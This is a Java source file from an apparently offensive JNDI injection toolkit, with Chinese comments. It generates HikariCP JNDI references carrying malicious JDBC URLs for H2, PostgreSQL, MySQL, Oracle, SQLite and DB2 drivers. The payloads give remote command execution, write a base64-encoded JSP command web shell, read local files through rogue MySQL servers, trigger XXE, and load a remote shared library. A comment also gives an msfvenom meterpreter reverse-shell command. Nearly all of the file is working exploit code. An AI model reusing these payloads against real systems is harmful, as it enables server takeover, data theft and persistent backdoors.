package sonomon.jndi.factory;

import java.net.MalformedURLException;
import java.net.URL;
import java.sql.Timestamp;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.List;
import javax.naming.Reference;
import javax.naming.StringRefAddr;

import sonomon.jndi.deser.Deserialize;
import sonomon.jndi.deser.Payload;

public class HikariJNDIFactory{
	//HikariCP-4.0.3.jar/sl4j-api-1.7.30.jar/slf4j-simple.jar
	private static String factory = "com.zaxxer.hikari.HikariJNDIFactory";
	private static String dllpath;
	
	//h2-1.4.200.jar
	public static Reference h2bypass(String payload){
		return h2exec(payload);
	}
	//postgresql-42.3.1.jar
	public static Reference postgresqlbypass1(String payload){
		return postgresqlfilewrite(payload);
	}
	//postgresql-42.3.1.jar
	public static Reference postgresqlbypass2(String payload){
		return postgresqlrce(payload);
	}
	//mysql-connector-java=>5.1.8需要增加maxAllowedPacket=655360
	//mysql-connector-java=>5.1.49需要增加allowLoadLocalInfile=true
	//增加allowUrlInLocalInfile=true可用url类的协议,即file/http/jar/netdoc
	public static Reference mysql5bypass(String payload){
		return mysql5fileread(payload);
	}
	//mysql-connector-java=>8.0.15需要增加allowLoadLocalInfile=true
	//mysql-connector-java=>8.0.24,MySQL_Fake_Server会报错,请尝试rogue_mysql_server
	//mysql8也带com.mysql.jdbc.Driver驱动,所以似乎不太需要这个
	public static Reference mysql8bypass(String payload){
		return mysql8fileread(payload);
	}
	//利用validationQuery执行load data local infile正规读文件
	public static Reference mysqlbypass(String payload){
		return mysqlreadfile(payload);
	}
	//5.1.30<=mysql-connector-java<=5.1.48
	public static Reference fabricbypass(String payload){
		return FabricXXE(payload);
	}
	//ojdbc6-12.1.0.1-atlassian-hosted.jar
	public static Reference oraclebypass1(String payload){
		return oracleGetUser(payload);
	}
	public static Reference oraclebypass2(String payload){
		return oracleXXE(payload);
	}
	
	
	//sqlite-jdbc-3.21.0.1.jar
	public static Reference sqlitebypass1(String payload){
		return sqliteRCE(payload);
	}
	//db2jcc.jar
	public static Reference db2bypass(String payload){
		return db2write(payload);
	}
	

	//h2-1.4.200.jar
	private static Reference h2exec(String cmd){
	    Reference ref = new Reference("javax.sql.DataSource",factory,null);
	    String JDBC_URL = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
	            "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
	            "java.lang.Runtime.getRuntime().exec('"+cmd+"')\n" +
	            "$$\n";
	    //jdk17移除Nashorn,要用下面这个
//	    JDBC_URL = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;return \"1\"\\;}'\\;"
//	    		+ "CALL EXEC ('"+cmd+"')";
        try {
			if (Deserialize.isDefaultPayload(cmd)) {
				if (Deserialize.isDefaultPayload(cmd)) {
					String jsString = Payload.getNashornJsPayload(cmd);
					jsString = jsString.replace(";", "\\;");
					JDBC_URL = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\r\n"
				    		+ "INFORMATION_SCHEMA.TABLES AS $$//javascript\r\n"
				    		+ jsString
							+ "$$";
				}
			}
		} catch (Exception e) {
			System.out.println("BeanFactory bshbypass error");
		}
	    //jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8000/poc.sql'
        //jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\;return "1"\;}'\;CALL EXEC ('calc')
	    ref.add(new StringRefAddr("driverClassName","org.h2.Driver"));
	    ref.add(new StringRefAddr("jdbcUrl",JDBC_URL));
	    ref.add(new StringRefAddr("username","root"));
	    ref.add(new StringRefAddr("password","root"));
		return ref;
	}
	//postgresql-42.3.1.jar
	private static Reference postgresqlfilewrite(String path){
		//path = "../shell.jsp";
	    Reference ref = new Reference("javax.sql.DataSource",factory,null);
	    String JDBC_URL = "jdbc:postgresql://<%Runtime.getRuntime().exec(request.getParameter(\"i\"));%>:52791/test?loggerLevel=TRACE&loggerFile="+path;
	    ref.add(new StringRefAddr("driverClassName","org.postgresql.Driver"));
	    ref.add(new StringRefAddr("jdbcUrl",JDBC_URL));
	    ref.add(new StringRefAddr("username","root"));
	    ref.add(new StringRefAddr("password","root"));
		return ref;
	}
	//postgresql-42.3.1.jar
	private static Reference postgresqlrce(String url){
//		url=http://127.0.0.1/exp.xml
//		需要单String的构造函数就能RCE的类,比如java.io.FileOutputStream可以新建空白文件
//		详情见org.postgresql.core.SocketFactory.getSocketFactory()
//		远程加载xml可SpEL表达式RCE,也可以XXE,RCE参考如下
//		<?xml version="1.0" encoding="UTF-8"?>
//		<beans xmlns="http://www.springframework.org/schema/beans"
//		       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
//		       xsi:schemaLocation="http://www.springframework.org/schema/beans
//		                        http://www.springframework.org/schema/beans/spring-beans.xsd">
//		    <bean id="world" class="java.lang.String">
//		        <constructor-arg value="#{T (java.lang.Runtime).getRuntime().exec('calc')}"/>
//		    </bean>
//		</beans>
	    Reference ref = new Reference("javax.sql.DataSource",factory,null);
	    String JDBC_URL = "jdbc:postgresql://127.0.0.1:52791/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg="+url;
	    ref.add(new StringRefAddr("driverClassName","org.postgresql.Driver"));
	    ref.add(new StringRefAddr("jdbcUrl",JDBC_URL));
	    ref.add(new StringRefAddr("username","root"));
	    ref.add(new StringRefAddr("password","root"));
		return ref;
	}
	
	//mysql-connector-java=>5.1.8需要增加maxAllowedPacket=655360
	//mysql-connector-java=>5.1.49需要增加allowLoadLocalInfile=true
	//增加allowUrlInLocalInfile=true可用url类的协议,即file/http/jar/netdoc
	private static Reference mysql5fileread(String ipportuser){
		//ipportuser = "127.0.0.1:3306@fileread_c:\\windows\\win.ini";
        List<String> list = null;
        String ipport = null;
        String user =  null;
        try {
        	list = Arrays.asList(ipportuser.split("\\@"));
        	ipport =  list.get(0);
        	user =  list.get(1);
		} catch (Exception e) {
			System.out.println("[-] payload error: "+ipportuser);
			System.out.println("[-] payload default: base64[127.0.0.1:3306@root]");
		}
	    Reference ref = new Reference("javax.sql.DataSource",factory,null);
	    String JDBC_URL = "jdbc:mysql://"+ipport+"/test?allowLoadLocalInfile=true&allowUrlInLocalInfile=true&maxAllowedPacket=655360&user="+user;
	    ref.add(new StringRefAddr("driverClassName","com.mysql.jdbc.Driver"));
	    ref.add(new StringRefAddr("jdbcUrl",JDBC_URL));
	    ref.add(new StringRefAddr("username","root"));
	    ref.add(new StringRefAddr("password","root"));
		return ref;
	}
	
	//mysql-connector-java=>8.0.15需要增加allowLoadLocalInfile=true
	//mysql-connector-java=>8.0.24,MySQL_Fake_Server会报错,请尝试rogue_mysql_server
	//mysql8也带com.mysql.jdbc.Driver驱动,所以似乎不太需要这个
	private static Reference mysql8fileread(String ipportuser){
		//ipportuser = "127.0.0.1:3306@fileread_c:\\windows\\win.ini";
        List<String> list = null;
        String ipport = null;
        String user =  null;
        try {
        	list = Arrays.asList(ipportuser.split("\\@"));
        	ipport =  list.get(0);
        	user =  list.get(1);
		} catch (Exception e) {
			System.out.println("[-] payload error: "+ipportuser);
			System.out.println("[-] payload default: base64[127.0.0.1:3306@root]");
		}
	    Reference ref = new Reference("javax.sql.DataSource",factory,null);
	    String JDBC_URL = "jdbc:mysql://"+ipport+"/test?allowLoadLocalInfile=true&allowUrlInLocalInfile=true&maxAllowedPacket=655360&user="+user;
	    ref.add(new StringRefAddr("driverClassName","com.mysql.cj.jdbc.Driver"));
	    ref.add(new StringRefAddr("jdbcUrl",JDBC_URL));
	    ref.add(new StringRefAddr("username","root"));
	    ref.add(new StringRefAddr("password","root"));
		return ref;
	}
	
	//利用validationQuery执行load data local infile正规读文件
	private static Reference mysqlreadfile(String payload){
        List<String> list = null;
        String ipport = null;
        String user =  null;
        String pass =  null;
        String path =  null;
        try {
        	list = Arrays.asList(payload.split("\\@"));
        	ipport =  list.get(0);
        	user =  list.get(1);
        	pass = list.get(2);
        	path = list.get(3);
		} catch (Exception e) {
			System.out.println("[-] payload error: "+payload);
			System.out.println("[-] payload default: base64[127.0.0.1:3306@root@123456@C://windows//win.ini]");
		}
    	Timestamp timestamp = new Timestamp(System.currentTimeMillis());
        SimpleDateFormat formatter = new SimpleDateFormat("yyyyMMddHHmmss");
        String formattedTimestamp = formatter.format(timestamp);
        String tablename = "file"+formattedTimestamp;
        System.out.println("[+] table is test."+tablename);
        String sql = "use test;\r\n"
	    		+ "create table "+tablename+" (aaa text);\r\n"
	    		+ "load data local infile '"+path+"' into table test."+tablename+";";
        
        
	    Reference ref = new Reference("javax.sql.DataSource",factory,null);
	    String JDBC_URL = "jdbc:mysql://"+ipport+"/test?allowMultiQueries=true&serverTimezone=UTC&allowLoadLocalInfile=true&allowUrlInLocalInfile=true&maxAllowedPacket=655360&user="+user+"&password="+pass;
	    ref.add(new StringRefAddr("driverClassName","com.mysql.jdbc.Driver"));
	    ref.add(new StringRefAddr("jdbcUrl",JDBC_URL));
	    ref.add(new StringRefAddr("username",user));
	    ref.add(new StringRefAddr("password",pass));
	    ref.add(new StringRefAddr("connectionInitSql",sql));
	    ref.add(new StringRefAddr("connectionTestQuery",sql));
		return ref;
	}
	
	
	//5.1.30<=mysql-connector-java<=5.1.48
	private static Reference FabricXXE(String ipport){
		//ipport = "127.0.0.1:81";
	    Reference ref = new Reference("javax.sql.DataSource",factory,null);
	    String JDBC_URL = "jdbc:mysql:fabric://"+ipport;
	    ref.add(new StringRefAddr("driverClassName","com.mysql.fabric.jdbc.FabricMySQLDriver"));
	    ref.add(new StringRefAddr("jdbcUrl",JDBC_URL));
	    ref.add(new StringRefAddr("username","root"));
	    ref.add(new StringRefAddr("password","root"));
		return ref;
	}
	//ojdbc6-12.1.0.1-atlassian-hosted.jar
	private static Reference oracleGetUser(String ipport){
		//ipport = "127.0.0.1:1521";
		//可带出user,orcl位置可换行,但无法攻击redis因为前面有\x00等脏数据,理论上可以打Memcached
	    Reference ref = new Reference("javax.sql.DataSource",factory,null);
	    String JDBC_URL = "jdbc:oracle:thin:@//"+ipport+"/orcl";
	    ref.add(new StringRefAddr("driverClassName","oracle.jdbc.driver.OracleDriver"));
	    ref.add(new StringRefAddr("jdbcUrl",JDBC_URL));
	    ref.add(new StringRefAddr("username","root"));
	    ref.add(new StringRefAddr("password","root"));
	    ref.add(new StringRefAddr("dataSource.oracle.jdbc.sqlTranslationProfile","1.xml"));
	    ref.add(new StringRefAddr("dataSource.oracle.jdbc.sqlErrorTranslationFile","1.xml"));
		return ref;
	}
	
	//ojdbc6-12.1.0.1-atlassian-hosted.jar
	private static Reference oracleXXE(String file){
		//file = "1.xml";
//		<?xml version="1.0" encoding="UTF-8"?>
//		<!DOCTYPE GVI [
//		<!ENTITY % xxe SYSTEM "http://127.0.0.1:5667/qqqq" >
//		%xxe;
//		]>
//		<Errors>
//		    <Exception>
//		        <ORAError>12345</ORAError>
//		        <ErrorCode>101</ErrorCode>
//		        <SQLState>08003</SQLState>
//		    </Exception>
//		</Errors>
	    Reference ref = new Reference("javax.sql.DataSource",factory,null);
	    String JDBC_URL = "jdbc:oracle:thin:@//127.0.0.1:1521/orcl";
	    ref.add(new StringRefAddr("driverClassName","oracle.jdbc.driver.OracleDriver"));
	    ref.add(new StringRefAddr("jdbcUrl",JDBC_URL));
	    ref.add(new StringRefAddr("username","root"));
	    ref.add(new StringRefAddr("password","root"));
	    ref.add(new StringRefAddr("dataSource.oracle.jdbc.sqlTranslationProfile",file));
	    ref.add(new StringRefAddr("dataSource.oracle.jdbc.sqlErrorTranslationFile",file));
		return ref;
	}
	//sqlite-jdbc-3.21.0.1.jar
	private static Reference sqliteRCE(String url){
//    	在windows环境用sqlite创建文件会将文件占用,会导致无法用load_extension读取,因此无法在同一线程完成RCE,要么重启web服务,要么用其他形式上传db文件,或者本地已知db文件
//    	如果load_extension读不到文件,会无限起线程去读,非常危险
//    	如果目标访问不到url,则会生成0kb的db文件,且无法覆盖,因此需要更改db名称以生成不同hashcode
//		msfvenom -p "linux/x64/meterpreter/reverse_tcp" lhost=2.2.2.2 lport=5667 -f elf-so -o 1.so
//      先连一个正常db下载到本地    url1 = "http://127.0.0.1:81/default.db";
//      再连一个恶意so下载到本地    url2 = "http://127.0.0.1:81/1.so";
//    	最后连本地的正常db并加载so  url3 = "/tmp/sqlite-jdbc-tmp-187526277.db";
//    	使用内存模式可以省略正常db
//		这个正常用法就是请求两次ldap://xxx/xxx/sqlitebypass1/[base64]http://127.0.0.1:81/default.db
		
		String jdbc = null;
		String sql = null;
		String tmpPath = "/tmp/sqlite-jdbc-tmp-";
		//tmpPath = "C:\\Users\\xxx\\AppData\\Local\\Temp\\sqlite-jdbc-tmp-";
		String tmpFile = null;
		
		//如果是http,tmpFile=本地缓存文件路径
		//如果非http,也就是直接设置tmpFile=本地文件
		if (url.startsWith("http")) {
			try {
				tmpFile = tmpPath + new URL(url).hashCode() + ".db";
			} catch (MalformedURLException e) {
				System.out.println("[-] sqliteRCE error");
				e.printStackTrace();
				return null;
			}
		} else {
			tmpFile = url;
		}
		
		//如果非http,直接用内存模式加载本地文件
		if (!url.startsWith("http")) {
			jdbc = "jdbc:sqlite:memory:test?enable_load_extension=true";
			sql = "select load_extension('"+tmpFile+"','dllmain')";
			System.out.println("[+] jdbc: "+jdbc);
			System.out.println("[+] sql: "+sql);
		//如果是http,看tmpFile是不是等于dllpath,是的话走内存模式加载本地文件
		} else if (url.startsWith("http")) {
			if (tmpFile.equals(dllpath)) {
					jdbc = "jdbc:sqlite:memory:test?enable_load_extension=true";
					sql = "select load_extension('"+tmpFile+"','dllmain')";
					System.out.println("[+] jdbc: "+jdbc);
					System.out.println("[+] sql: "+sql);
        //如果是http,tmpFile又不等于dllpath,那么把dllpath=tmpFile,并执行一次SQL,将缓存文件写进去,为第二次做准备
			} else {
				dllpath = tmpFile;
				jdbc = "jdbc:sqlite::resource:"+url;
				System.out.println("[+] dllpath save: "+dllpath);
				System.out.println("[+] jdbc: "+jdbc);
				System.out.println("[+] Request twice ldap://xxx/xxx/sqlitebypass1/[base64]"+url);
			}
		}
		
	    Reference ref = new Reference("javax.sql.DataSource",factory,null);
	    ref.add(new StringRefAddr("driverClassName","org.sqlite.JDBC"));
	    ref.add(new StringRefAddr("jdbcUrl",jdbc));
	    if (sql != null) {
	    	ref.add(new StringRefAddr("connectionInitSql",sql));
		}
		return ref;
	}
	private static Reference db2write(String contentpath){
		//${Runtime.getRuntime().exec(param.cmd)}@../webapps/ROOT/shell.jsp
		//因为jdbc需要用到分号,所以只能用EL表达式
		String content = null;
		String path = null;
		if (contentpath.contains("@")) {
	        List<String> list = Arrays.asList(contentpath.split("\\@"));
	        content =  list.get(0);
	        path =  list.get(1);
			
		} else {
			content = "${"
					+ "''.getClass().forName(\"java.io.FileOutputStream\")"
					+ ".getDeclaredConstructor(''.getClass())"
					+ ".newInstance(\""
					+ contentpath
					+ "\")"
					+ ".write(''.getClass().forName(\"org.apache.tomcat.util.codec.binary.Base64\").newInstance().decodeBase64(\""
					+ "PCVTdHJpbmcgY21kID0gcmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpO2Jvb2xlYW4gaXNXaW4gPSBqYXZhLmxhbmcuU3lzdGVtLmdldFByb3BlcnR5KCJvcy5uYW1lIikudG9Mb3dlckNhc2UoKS5jb250YWlucygid2luIik7U3RyaW5nW10gY21kcyA9IGlzV2luID8gbmV3IFN0cmluZ1tdeyJjbWQuZXhlIiwgIi9jIiwgY21kfSA6IG5ldyBTdHJpbmdbXXsiL2Jpbi9zaCIsICItYyIsIGNtZH07amF2YS51dGlsLlNjYW5uZXIgcyA9IG5ldyBqYXZhLnV0aWwuU2Nhbm5lcihSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKGNtZHMpLmdldElucHV0U3RyZWFtKCkpLnVzZURlbGltaXRlcigiXFxhIik7U3RyaW5nIG91dHB1dCA9IHMuaGFzTmV4dCgpID8gcy5uZXh0KCkgOiAiIjtvdXQucHJpbnQob3V0cHV0KTslPg=="
					+ "\".getBytes())).close()"
					+ "}";
			path = contentpath;
		}
		
		
	    Reference ref = new Reference("javax.sql.DataSource",factory,null);
	    String JDBC_URL = "jdbc:db2://127.0.0.1:5001/test:user="+content+";password=123456;traceLevel=-1;traceFileAppend=false;traceFile="+path+";";
	    ref.add(new StringRefAddr("driverClassName","com.ibm.db2.jcc.DB2Driver"));
	    ref.add(new StringRefAddr("jdbcUrl",JDBC_URL));
		return ref;
	}
	
	
}
